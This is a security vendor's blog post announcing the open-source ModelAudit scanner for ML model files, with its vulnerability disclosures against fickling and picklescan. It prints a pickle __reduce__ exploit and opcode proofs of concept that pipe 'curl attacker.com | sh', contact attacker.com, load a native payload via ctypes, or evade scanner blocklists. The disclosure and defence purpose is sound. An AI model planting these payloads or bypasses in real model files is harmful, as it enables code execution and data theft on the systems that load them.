---
title: 'Open-Sourcing ModelAudit: Security Scanner for ML Model Files'
description: 'Promptfoo ModelAudit scans 42+ ML model formats for unsafe loading behaviors, known CVEs, and suspicious artifacts. Now MIT-licensed and open source.'
image: /img/blog/open-sourcing-modelaudit/hero.jpg
keywords:
  [
    ModelAudit,
    ML model security,
    AI supply chain security,
    model scanning,
    pickle security,
    malicious model detection,
    PyTorch vulnerability,
    ONNX security,
    open source security scanner,
    model file scanner,
    AI security tool,
    CVE detection ML models,
    machine learning security,
    model serialization attack,
    deserialization attack,
    model supply chain,
    Hugging Face model scanning,
    torch.load security,
  ]
date: 2026-03-03
authors: [yash]
tags: [company-update, model-security, open-source, ai-security]
---

# Open-Sourcing ModelAudit

Before joining Promptfoo, I worked on model scanning at Databricks. Teams pulled models from public registries, ran `torch.load()`, and treated the artifact like inert data. Model files are executable at load time.

Since joining Promptfoo last September, I've been building ModelAudit, a static security scanner for ML model files. We filed 7 GHSAs against existing scanners, including a CVSS 10.0 universal bypass, and validated against thousands of real models with zero false positives. Last week we released it as an MIT-licensed open-source project.

<!-- truncate -->

## ModelAudit at a glance

ModelAudit is a static scanner for ML model files. It flags unsafe loading behaviors (deserialization RCE, archive tricks), known CVEs, and suspicious artifacts across [42+ formats](/docs/model-audit/scanners/), without executing the model or importing ML frameworks.

[ModelAudit](https://github.com/promptfoo/modelaudit) is the open-source engine (Python, MIT). `promptfoo scan-model` is a CLI wrapper; you can also run `modelaudit scan` directly.

```bash
pip install modelaudit
modelaudit scan your_model.pkl
```

The scanning engine runs entirely offline - it never loads or executes the model.

<details>
<summary>Example output</summary>

```
Scanning suspicious_model.pkl...

📊 SCAN SUMMARY
  Files: 1 | Duration: 0.29s
  Security Checks: ✅ 12 passed / ❌ 3 failed

🔍 SECURITY FINDINGS
  🚨 2 Critical | ⚠️ 1 Warning

    └─ 🚨 [suspicious_model.pkl (pos 45)]
       Found REDUCE opcode with non-allowlisted global: posix.system
       Why: The REDUCE opcode calls a callable with arguments, effectively
           executing arbitrary Python functions. This is the primary
           mechanism for pickle-based code execution attacks.
       opcode: REDUCE
       associated_global: posix.system (os.system on Unix)

    └─ ⚠️ [suspicious_model.pkl]
       Model affected by CVE-2025-32434 (PyTorch weights_only bypass)
       severity: CRITICAL
       affected_versions: torch<2.6.1
       remediation: Upgrade to torch>=2.6.1

  ❌ CRITICAL SECURITY ISSUES FOUND
```

</details>

Capabilities:

- **Formats:** PyTorch, pickle, Keras, ONNX, TensorFlow, GGUF, CoreML, LightGBM, and [34+ more](/docs/model-audit/scanners/)
- **Output:** Text, JSON, [SARIF](https://sarifweb.azurewebsites.net/) for [CI/CD integration](/docs/model-audit/ci-cd)
- **Extras:** [SBOM generation](https://cyclonedx.org/), license detection, secret scanning
- **Remote pulls:** S3, GCS, Hugging Face Hub, MLflow, JFrog, DVC

```bash
# Scan from Hugging Face
modelaudit scan hf://microsoft/DialoGPT-medium

# SARIF output for GitHub Code Scanning / GitLab SAST
modelaudit scan model.pt --format sarif --output results.sarif

# Via the Promptfoo CLI wrapper (requires Node)
npx promptfoo scan-model model.pt
```

Python 3.10–3.13. Linux, macOS, Windows. No ML framework dependencies.

**Who this is for:** Platform and AppSec teams that gate model artifacts in CI/CD, and anyone pulling models from public registries or running third-party checkpoints.

---

## Model files execute code at load time

When you `pip install` a package, you probably run it through a dependency scanner. Most teams do nothing equivalent when they download a model from Hugging Face and call `torch.load()`.

In pickle, `__reduce__` defines what gets executed during unpickling:

```python
import pickle, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("touch /tmp/pwned",))

# When loaded via pickle.loads() or torch.load(),
# os.system() executes the command.
payload = pickle.dumps(Exploit())
```

[JFrog found roughly 100 models](https://jfrog.com/blog/data-scientists-targeted-by-malicious-hugging-face-ml-models-with-silent-backdoor/) on Hugging Face containing similar payloads. Those were the obvious ones - flagged and removed.

During our last batch of refinement for ModelAudit, we stumbled across models that we caught true positives on that bypass every other scanner in Hugging Face's pipeline:

**[Rammadaeus/tflite-flex-bypass-poc](https://huggingface.co/Rammadaeus/tflite-flex-bypass-poc)** - A TFLite file with 4 malicious custom operators: `FlexWriteFile` (write arbitrary files), `FlexReadFile` (read arbitrary files), `FlexPrintV2` (output exfiltration), and `EagerPyFunc` (arbitrary Python execution).

<img src="/img/blog/open-sourcing-modelaudit/scanner-comparison-tflite.svg" alt="Scanner comparison for Rammadaeus/tflite-flex-bypass-poc: VirusTotal, JFrog, and ClamAV report No Issue. HF Picklescan and ModelScan do not support TFLite. ModelAudit reports 4 CRITICAL findings." style={{maxWidth: '520px', width: '100%', margin: '1rem auto', display: 'block'}} />

Every scanner in Hugging Face's pipeline misses this one - VirusTotal, JFrog, ClamAV report no issue, and picklescan and ModelScan don't support TFLite at all. ModelAudit catches all four malicious operators.

**[0xnu/mnist-ocr](https://huggingface.co/0xnu/mnist-ocr/)** - The `mnist_tokenizer.pkl` file contains `__main__.ImageTokenizer` instantiated via the `NEWOBJ` opcode, a deserialization vector that executes arbitrary code on load.

<img src="/img/blog/open-sourcing-modelaudit/scanner-comparison-mnist.svg" alt="Scanner comparison for 0xnu/mnist-ocr: VirusTotal, JFrog, and ModelScan report No Issue. HF Picklescan flags suspicious imports (informational). ClamAV flags as Suspicious via signature match. ModelAudit reports CRITICAL." style={{maxWidth: '520px', width: '100%', margin: '1rem auto', display: 'block'}} />

Only ClamAV flags it, and only via signature matching, not structural analysis. VirusTotal, JFrog, and ModelScan all miss it.

**[NewstaR/GPTagalog](https://huggingface.co/NewstaR/GPTagalog)** - A 396 MB GPT model for Tagalog. The `model-01.pkl` file uses `torch.storage._load_from_bytes` via the `REDUCE` opcode (21 instances) and loads classes from `__main__` scope - the same deserialization pattern used in pickle-based attacks.

<img src="/img/blog/open-sourcing-modelaudit/scanner-comparison-gptagalog.svg" alt="Scanner comparison for NewstaR/GPTagalog: VirusTotal, JFrog, and Protect AI (ModelScan) report No Issue. ClamAV flags as Suspicious via signature match. ModelAudit reports CRITICAL." style={{maxWidth: '520px', width: '100%', margin: '1rem auto', display: 'block'}} />

VirusTotal, JFrog, and ModelScan all miss it. Only ClamAV flags it via signature matching - not structural analysis. ModelAudit catches the dangerous deserialization pattern.

**[Freakhobbies/Model-01.pkl](https://huggingface.co/Freakhobbies/Model-01.pkl)** - A 7.6 MB PyTorch GPT model with the same pattern: `torch.storage._load_from_bytes` via `REDUCE` and `__main__` class references.

<img src="/img/blog/open-sourcing-modelaudit/scanner-comparison-freakhobbies.svg" alt="Scanner comparison for Freakhobbies/Model-01.pkl: VirusTotal Queued. JFrog and Protect AI (ModelScan) report No Issue. HF Picklescan flags suspicious imports (informational). ClamAV flags as Suspicious via signature match. ModelAudit reports CRITICAL." style={{maxWidth: '520px', width: '100%', margin: '1rem auto', display: 'block'}} />

JFrog and ModelScan report no issue. Picklescan flags suspicious imports but only as informational. ClamAV catches it via signature. ModelAudit reports CRITICAL.

Hugging Face hosts over two million models. Most organizations pull from public registries without scanning what they download.

## How we got here

### Building at Promptfoo

When I joined Promptfoo, the team was building [AI red teaming](https://www.promptfoo.dev/docs/red-team/) and [code scanning](https://www.promptfoo.dev/code-scanning/) capabilities. We could test how an LLM application _behaves_ at runtime, but had no visibility into whether the models themselves were safe to load. If a model file triggers code execution on deserialization, runtime defenses don't matter. The compromise happens before the application starts.

The team had already built an early version of the scanner with the core architecture in place. When I joined, we expanded it significantly - adding opcode-level bypass detection, growing format coverage to the 42+ formats we support today, and introducing an allowlist-first approach with systematic false positive elimination. The goal was a modern, lightweight scanner with no ML framework dependencies - something you could drop into any CI pipeline without pulling in PyTorch or TensorFlow.

### The false positive problem

Every ML framework serializes models differently. The same scikit-learn RandomForest saved with `joblib` vs `pickle` vs `skops` produces different opcode sequences. Upgrading Python or library versions changes which opcodes appear. An allowlist-based scanner that works on Python 3.10 might flag clean models on 3.13. And that's just pickle - every format we added had its own version of this problem: ONNX models with legitimate external data references tripping path traversal checks, Keras archives with custom layer configs that look like code injection, GGUF metadata fields that resemble suspicious strings.

We ran several rounds of false positive elimination against real Hugging Face models across every supported format. Each round surfaced new edge cases - legitimate patterns that looked suspicious to heuristic checks. We fixed them all.

The maturity milestone: 1,000+ models scanned across 14 formats, 5,000+ security checks, zero false positives on the final 100-model regression run. Since then, we've expanded to 42+ formats with 12 new scanners and validated against an additional 200+ models - all clean. That result triggered the open-source decision.

ModelAudit started as an internal capability within the Promptfoo platform ([promptfoo.dev/model-security](https://www.promptfoo.dev/model-security/)). Today's release is the standalone extraction of that scanning engine.

## Existing scanners and where they break

[Picklescan](https://github.com/mmaitre314/picklescan) is [integrated into Hugging Face's scanning pipeline](https://huggingface.co/docs/hub/en/security-pickle) and is fast and practical at scale. [Fickling](https://github.com/trailofbits/fickling) by Trail of Bits can decompile pickle streams into readable Python and recently added an [allowlist-based scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/). [ModelScan](https://github.com/protectai/modelscan) by ProtectAI covers Pickle, PyTorch, Keras (H5 and V3), TensorFlow SavedModel, NumPy, and Joblib; ProtectAI's commercial offering [Guardian](https://protectai.com/guardian) extends to 35+ formats. [Safetensors](https://github.com/huggingface/safetensors) takes the strongest approach: eliminate executable code from the format entirely. If you can use safetensors, you should. But [roughly 45% of popular Hugging Face models still use pickle](https://cs.brown.edu/~vpk/papers/pickleball.ccs25.pdf) (CCS 2025), and the [conversion pipeline itself can be a target](https://hiddenlayer.com/innovation-hub/silent-sabotage/).

The common weakness across blocklist-based scanners is architectural: maintain a list of known-dangerous functions and allow everything else through. An attacker only needs to find one function _not_ on the list. Fickling has [12 published GHSAs](https://github.com/trailofbits/fickling/security/advisories). Picklescan has [60+](https://github.com/mmaitre314/picklescan/security/advisories). JFrog found [3 zero-day bypasses in picklescan](https://jfrog.com/blog/unveiling-3-zero-day-vulnerabilities-in-picklescan/) (CVE-2025-10155/10156/10157, CVSS 9.3 each). Sonatype found [4 more](https://www.sonatype.com/blog/bypassing-picklescan-sonatype-discovers-four-vulnerabilities) (CVE-2025-1716, CVE-2025-1889, CVE-2025-1944, CVE-2025-1945). We reported seven of our own.

Building ModelAudit meant studying the pickle VM closely: how its ~68 opcodes chain together across protocol versions 0–5, how function calls get resolved, and where the gaps are in static analysis. That work kept turning up bypasses in existing scanners.

### Fickling bypasses

We reported four GHSAs against fickling, all fixed by Trail of Bits.

**[GHSA-5hwf-rc88-82xm](https://github.com/advisories/GHSA-5hwf-rc88-82xm) - Missing RCE-capable modules in `UNSAFE_IMPORTS`.** At least 3 stdlib modules that provide direct arbitrary command execution were not blocked: `uuid`, `_osx_support`, and `_aix_support`. These modules contain functions that internally call `subprocess.Popen()` or `os.system()` with attacker-controlled arguments. Despite the platform-specific names, all three are importable on every platform:

```python
# Pickle opcodes:
STACK_GLOBAL  uuid _get_command_stdout   # not in UNSAFE_IMPORTS
SHORT_BINUNICODE "curl"
SHORT_BINUNICODE "http://attacker.com"
TUPLE2
REDUCE                                   # uuid._get_command_stdout("curl", "http://attacker.com")
                                         # → subprocess.Popen(("curl", "http://..."), stdout=PIPE)
# fickling: LIKELY_SAFE
```

Trail of Bits fixed this in fickling 0.1.9.

**[GHSA-mxhj-88fx-4pcv](https://github.com/advisories/GHSA-mxhj-88fx-4pcv) (CVSS 8.6) - `OBJ` opcode invisibility.** Fickling's `OBJ` opcode handler pushed function calls onto the interpreter stack without saving them to the AST. Discard the result with `POP` and the call vanishes from fickling's analysis entirely:

```python
# Pickle opcodes:
OBJ(os.system, "curl attacker.com | sh")  # call happens at load time
POP                                        # result discarded from stack
# → call vanishes from AST, fickling reports LIKELY_SAFE
```

A pickle could spawn a reverse shell and fickling would report `LIKELY_SAFE`.

**[CVE-2026-22609](https://github.com/advisories/GHSA-q5qq-mvfm-j35x) - Missing unsafe imports.** My teammate [Michael D'Angelo](https://www.linkedin.com/in/michaelldangelo/) found that fickling's unsafe-imports list was missing high-risk standard library modules including `ctypes`, `importlib`, and `multiprocessing`. A pickle importing `ctypes.CDLL` to load a shared library passed as safe:

```python
# Pickle opcodes (simplified):
GLOBAL    ctypes CDLL              # loads ctypes.CDLL
MARK
SHORT_BINUNICODE "./payload.so"    # path to attacker's shared library
TUPLE
REDUCE                             # ctypes.CDLL("./payload.so") → loads and executes native code
# fickling: SAFE (ctypes not in unsafe-imports list)
```

Trail of Bits patched this in fickling 0.1.7.

**[GHSA-mhc9-48gj-9gp3](https://github.com/advisories/GHSA-mhc9-48gj-9gp3) - Incomplete blocklist missing network and system unsafe imports.** Fickling's `likely_safe_imports` set included all stdlib modules, so dangerous modules like `smtplib`, `socketserver`, `signal`, and `sqlite3` were treated as safe. A pickle calling `socketserver.TCPServer` to open a backdoor listener or `smtplib.SMTP` to exfiltrate data passed all five safety interfaces:

```python
# Pickle opcodes:
STACK_GLOBAL  smtplib SMTP          # stdlib module - added to likely_safe_imports
SHORT_BINUNICODE "attacker.com"
TUPLE1
REDUCE                              # smtplib.SMTP("attacker.com") → opens TCP connection
# → fickling: LIKELY_SAFE (smtplib is stdlib, skipped by OvertlyBadEvals)
```

Trail of Bits fixed this in fickling 0.1.8.

### Picklescan bypasses

On March 3, 2026, we published three GHSAs against picklescan.

**[GHSA-vvpj-8cmc-gx39](https://github.com/advisories/GHSA-vvpj-8cmc-gx39) (CVSS 10.0) - `pkgutil.resolve_name` universal blocklist bypass.** `pkgutil.resolve_name()` is a Python stdlib function that resolves any `"module:attribute"` string to the actual Python object at runtime. A malicious pickle uses it as the `REDUCE` callable to obtain a reference to _any_ blocked function - `os.system`, `builtins.exec`, anything - without that function's name appearing in the pickle opcodes:

```python
# Pickle opcodes (simplified):
GLOBAL    pkgutil resolve_name    # not blocked by picklescan
MARK
SHORT_BINUNICODE "os:system"     # the actual target, passed as data
TUPLE
REDUCE                           # pkgutil.resolve_name("os:system") → os.system
# picklescan sees: pkgutil.resolve_name → CLEAN
# actual effect: os.system obtained, ready to call with arbitrary arguments
```

The blocklist never sees `os.system`. It only sees `pkgutil.resolve_name`, which is not blocked. One opcode sequence bypasses the entire blocklist.

**[GHSA-g38g-8gr9-h9xp](https://github.com/advisories/GHSA-g38g-8gr9-h9xp) (CVSS 9.8) - Multiple stdlib modules with direct RCE not in blocklist.** At least 7 Python stdlib modules that provide direct command execution or code evaluation were not blocked: `codeop`, `code`, `compileall`, `py_compile`, `runpy`, `profile`, and `pdb`. A malicious pickle importing any of these modules reports 0 issues:

```python
# Pickle opcodes:
GLOBAL    codeop compile_command    # compiles arbitrary Python source into executable code objects
MARK
SHORT_BINUNICODE "import os; os.system('curl attacker.com | sh')"
TUPLE
REDUCE
# picklescan: CLEAN (codeop not in blocklist)
```

**[GHSA-7wx9-6375-f5wh](https://github.com/advisories/GHSA-7wx9-6375-f5wh) (CVSS 9.8) - `profile.run()` blocklist mismatch.** Picklescan blocks `profile.Profile.run` and `profile.Profile.runctx` but _not_ the module-level `profile.run()` function. The blocklist entry `Profile.run` doesn't match the pickle global name `run`. `profile.run(statement)` calls `exec()` internally:

```python
# Pickle opcodes:
GLOBAL    profile run                 # module-level function, not Profile.run
MARK
SHORT_BINUNICODE "os.system('id')"   # arbitrary Python statement
TUPLE
REDUCE                               # profile.run("os.system('id')") → exec() internally
# picklescan blocklist has: profile.Profile.run ← doesn't match "run"
# picklescan result: CLEAN
```

Each gap existed because the blocklist hadn't enumerated that specific entry yet. This is what it means for blocklist-based scanning to be reactive.

Trail of Bits and the picklescan maintainers fixed these quickly. The pickle VM is adversarial territory, and every scanner that operates there will have gaps. We follow coordinated disclosure for all findings and publish POCs as test cases, not weaponized attacks.

ModelAudit is the widest-coverage open-source scanner available, with format-specific analysis across 42+ formats, built-in CVE detection rules, and SARIF output for CI/CD integration. In a [head-to-head comparison](/blog/modelaudit-vs-modelscan) against ModelScan, ModelAudit detected 16 issues across 11 test files vs ModelScan's 3. Our team has contributed 7 GHSAs across fickling and picklescan. Teams already using picklescan or ModelScan can run ModelAudit alongside them; SARIF results from multiple scanners aggregate in the same CI pipeline.

### Format coverage comparison

The most meaningful way to compare scanners is format by format. Here is what each open-source tool covers (March 2026; see each project's repository for current status):

| Format                         | picklescan | Fickling | ModelScan | **ModelAudit** |
| ------------------------------ | :--------: | :------: | :-------: | :------------: |
| Pickle (.pkl/.pickle)          |    Yes     |   Yes    |    Yes    |    **Yes**     |
| Dill (.dill)                   |     -      |    -     |    Yes    |    **Yes**     |
| PyTorch (.pt/.pth/.bin)        |    Yes     | .pt/.pth |    Yes    |    **Yes**     |
| Joblib (.joblib)               |    Yes     |    -     |    Yes    |    **Yes**     |
| Skops (.skops)                 |     -      |    -     |     -     |    **Yes**     |
| NumPy (.npy/.npz)              |    Yes     |    -     | .npy only |    **Yes**     |
| Keras H5 (.h5/.hdf5)           |     -      |    -     |    Yes    |    **Yes**     |
| Keras ZIP (.keras)             |     -      |    -     |    Yes    |    **Yes**     |
| TensorFlow SavedModel (.pb)    |     -      |    -     |    Yes    |    **Yes**     |
| TF MetaGraph (.meta)           |     -      |    -     |     -     |    **Yes**     |
| ONNX (.onnx)                   |     -      |    -     |     -     |    **Yes**     |
| SafeTensors (.safetensors)     |     -      |    -     |     -     |    **Yes**     |
| GGUF/GGML                      |     -      |    -     |     -     |    **Yes**     |
| JAX/Flax (.msgpack/.orbax)     |     -      |    -     |     -     |    **Yes**     |
| JAX Checkpoint (.ckpt)         |     -      |    -     |     -     |    **Yes**     |
| TFLite (.tflite)               |     -      |    -     |     -     |    **Yes**     |
| ExecuTorch (.pte)              |     -      |    -     |     -     |    **Yes**     |
| TensorRT (.plan/.engine)       |     -      |    -     |     -     |    **Yes**     |
| PaddlePaddle (.pdmodel)        |     -      |    -     |     -     |    **Yes**     |
| OpenVINO (.xml/.bin)           |     -      |    -     |     -     |    **Yes**     |
| CoreML (.mlmodel/.mlpackage)   |     -      |    -     |     -     |    **Yes**     |
| MXNet (.params/-symbol.json)   |     -      |    -     |     -     |    **Yes**     |
| CatBoost (.cbm)                |     -      |    -     |     -     |    **Yes**     |
| LightGBM (.lgb/.txt/.model)    |     -      |    -     |     -     |    **Yes**     |
| XGBoost (.bst/.model/.ubj)     |     -      |    -     |     -     |    **Yes**     |
| RKNN (.rknn)                   |     -      |    -     |     -     |    **Yes**     |
| Torch7 (.t7/.th)               |     -      |    -     |     -     |    **Yes**     |
| Llamafile (.llamafile)         |     -      |    -     |     -     |    **Yes**     |
| R Serialized (.rds/.rda)       |     -      |    -     |     -     |    **Yes**     |
| CNTK (.cntk/.dnn)              |     -      |    -     |     -     |    **Yes**     |
| PMML (.pmml)                   |     -      |    -     |     -     |    **Yes**     |
| TorchServe MAR (.mar)          |     -      |    -     |     -     |    **Yes**     |
| Jinja2 Templates (.jinja/.j2)  |     -      |    -     |     -     |    **Yes**     |
| OCI/Docker Layers (.manifest)  |     -      |    -     |     -     |    **Yes**     |
| Weight Distribution Analysis   |     -      |    -     |     -     |    **Yes**     |
| Compressed (.gz/.bz2/.xz/.zst) |     -      |    -     |     -     |    **Yes**     |
| ZIP archives (.zip/.npz)       |    Yes     |    -     |    Yes    |    **Yes**     |
| TAR archives (.tar/.tar.gz)    |     -      |    -     |     -     |    **Yes**     |
| 7-Zip archives (.7z)           |  Optional  |    -     |     -     |    **Yes**     |
| Config (JSON/YAML/XML/TOML)    |     -      |    -     |     -     |    **Yes**     |
| **Total format categories**    |   **~4**   |  **~2**  |  **~8**   |    **42+**     |

_Counts reflect distinct model format categories, not file extensions. All three tools are open source - see each repository for current status._

- _**picklescan:** Pickle, PyTorch, NumPy, Joblib, plus archive support_
- _**Fickling:** Pickle, PyTorch (extension-agnostic, operates on pickle byte streams)_
- _**ModelScan:** Pickle/Dill/Cloudpickle, PyTorch, Keras H5, Keras V3, TF SavedModel, NumPy (.npy only - .npz not yet implemented), Joblib, plus ZIP support_

| Capability               | picklescan | Fickling | ModelScan |        **ModelAudit**         |
| ------------------------ | :--------: | :------: | :-------: | :---------------------------: |
| CVE detection rules      |     No     |    No    |    No     |            **Yes**            |
| SARIF output             |     No     |    No    |    No     |            **Yes**            |
| SBOM generation          |     No     |    No    |    No     |            **Yes**            |
| Secret scanning          |     No     |    No    |    No     |            **Yes**            |
| License detection        |     No     |    No    |    No     |            **Yes**            |
| Remote pulls (S3/GCS/HF) |   HF/URL   |    No    |    No     | **Yes (S3/GCS/HF/R2/MLflow)** |
| Allowlist approach       |  Partial   |   Yes    |    No     |            **Yes**            |
| No ML framework deps     |    Yes     |   Yes    |    No     |            **Yes**            |

ModelAudit is not a replacement for these tools - they've all contributed to making this space better.

## Get started

The entire scanning engine is in the [open-source repository](https://github.com/promptfoo/modelaudit). All scanners, all CVE detection rules, all output formats.

```bash
pip install modelaudit
modelaudit scan your_model.pkl
```

- [Documentation](/docs/model-audit/)
- [Scanner reference](/docs/model-audit/scanners/)
- [CI/CD integration guide](/docs/model-audit/ci-cd)
- [Advanced usage](/docs/model-audit/usage)
- [Contribution guide](https://github.com/promptfoo/modelaudit/blob/main/CONTRIBUTING.md)

If you find a bypass, we follow coordinated disclosure and will credit you.

Promptfoo also offers ModelAudit with a hosted UI and managed integrations in the [platform](https://www.promptfoo.dev/model-security/). The engine is the same open-source code.

[Open issues](https://github.com/promptfoo/modelaudit/issues) on GitHub or reach out directly.
